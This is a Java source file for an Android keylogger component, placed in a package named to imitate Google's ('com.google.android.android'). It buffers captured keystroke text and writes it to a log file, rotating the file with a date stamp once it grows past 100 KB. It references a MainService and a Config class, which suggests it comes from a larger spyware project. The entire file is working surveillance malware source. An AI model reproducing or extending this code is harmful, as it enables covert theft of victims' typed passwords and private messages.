package com.google.android.android;

import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;

public class Keylogger {
    private static final int BUFFER_SIZE = 300;
    private static String buffer = "";
    private static File logFile = new File(Config.KEYLOGGER_PATH + "key-log.txt");

    public static void put(String text) {
        if (text == null || text.trim().length() == 0) return;
        buffer += text;
        if (buffer.length() > BUFFER_SIZE) {
            try {
                FileWriter fileWriter = new FileWriter(logFile, true);
                fileWriter.write(buffer);
                fileWriter.flush();
                fileWriter.close();
                buffer = "";

                if (logFile.length() > 1024 * 100) {
                    String date = MainService.getInstance().getSimpleDateFormat(System.currentTimeMillis());
                    logFile.renameTo(new File(Config.KEYLOGGER_PATH + "key-log " + date + ".json"));
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

}
